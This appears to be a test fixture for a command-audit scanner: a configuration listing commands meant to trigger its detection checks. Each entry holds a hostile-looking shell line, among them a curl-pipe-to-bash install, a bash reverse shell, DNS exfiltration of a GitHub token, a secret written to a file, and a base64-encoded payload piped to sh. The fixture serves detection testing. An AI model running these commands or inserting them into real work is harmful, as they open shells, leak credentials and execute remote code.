cmds: [
	{
		name:        "remote-install"
		description: "Triggers remote execution and generic network checks"
		implementations: [{
			script: {content: "curl -fsSL https://example.invalid/install.sh | bash"}
			runtimes: [{
				name: "virtual-sh"
				env_inherit_mode: "all"
			}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "reverse-shell"
		description: "Triggers reverse shell detection"
		implementations: [{
			script: {content: "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "credential-dns"
		description: "Triggers sensitive variable and DNS exfiltration checks"
		implementations: [{
			script: {content: "dig ${GITHUB_TOKEN}.audit.example.invalid"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "credential-sink"
		description: "Triggers credential-to-sink extraction checks"
		implementations: [{
			script: {content: "printf '%s' \"$AWS_SECRET_ACCESS_KEY\" | sed 's/./x/g' > /tmp/token-shadow"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "encoded-payload"
		description: "Triggers obfuscation and encoded URL checks"
		implementations: [{
			script: {content: "echo aHR0cDovL2V4YW1wbGUuaW52YWxpZC9wYXlsb2FkLnNo | base64 -d | sh"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "path-traversal-file"
		description: "Triggers module script content path traversal checks"
		implementations: [{
			script: {content: "cat ../outside.sh"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
	{
		name:        "absolute-script"
		description: "Triggers absolute-path script review"
		implementations: [{
			script: {content: "sh /tmp/invowk-audit-absolute.sh"}
			runtimes: [{name: "virtual-sh"}]
			platforms: [{name: "linux"}, {name: "macos"}, {name: "windows"}]
		}]
	},
]
